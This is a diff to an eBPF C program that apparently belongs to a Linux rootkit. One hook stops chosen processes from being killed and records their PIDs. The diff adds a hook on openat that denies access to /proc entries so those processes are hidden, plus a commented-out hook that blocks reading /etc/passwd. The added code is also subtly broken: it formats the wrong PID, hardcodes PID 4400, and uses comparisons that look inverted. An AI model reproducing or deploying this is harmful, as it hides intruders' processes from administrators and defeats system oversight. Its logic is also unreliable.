@@ -90,12 +90,66 @@ int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
     pid_t target_pid = BPF_CORE_READ(p, tgid);
     bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
     index_pids++;
-    bpf_printk("magic!!!\n");
+    bpf_printk("magic performed on %d!!!\n", target_pid);
     return -EPERM;
   }
   return 0;
 }
 
 // shit for hiding processes
+// SEC("lsm/file_open")
+// int BPF_PROG(file_open, struct file *file) {
+//  char path[256];
+//  pid_t pid = bpf_get_current_pid_tgid() >> 32;
+//
+//  // Get the absolute path
+//  bpf_d_path(&file->f_path, path, sizeof(path));
+//
+//  // Block access to specific files
+//  if (bpf_strstr(path, "secret.txt") == 0) {
+//    bpf_printk("PID %d: BLOCKED %s\n", pid, path);
+//    return -EACCES; // Permission denied
+//  }
+//
+//  // Block /etc/passwd
+//  if (bpf_strstr(path, "/etc/passwd") == 0) {
+//    bpf_printk("PID %d: BLOCKED /etc/passwd\n", pid);
+//    return -EPERM;
+//  }
+//
+//  return 0; // Allow
+//}
+
+SEC("fmod_ret/__x64_sys_openat")
+int BPF_PROG(modify_openat, const struct pt_regs *regs) {
+  pid_t pid = bpf_get_current_pid_tgid() >> 32;
+
+  // Block specific processes from seeing directory entries
+  if (pid == 4400) {
+    return 0;
+  }
+  const char *user_filename;
+  user_filename = (const char *)regs->si;
+  __u32 i;
+  pid_t *value;
+  bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
+    value = (pid_t *)bpf_map_lookup_elem(&pidToHideMap, &i);
+
+    if (value == 0) {
+      continue;
+    }
+
+    char pid_str[64];
+    BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", pid);
+
+    if (bpf_strstr(pid_str, user_filename) == 0) {
+      bpf_printk("blocked\n");
+
+      return -EPERM;
+    }
+  }
+
+  return 0;
+}
 
 char LICENSE[] SEC("license") = "GPL";
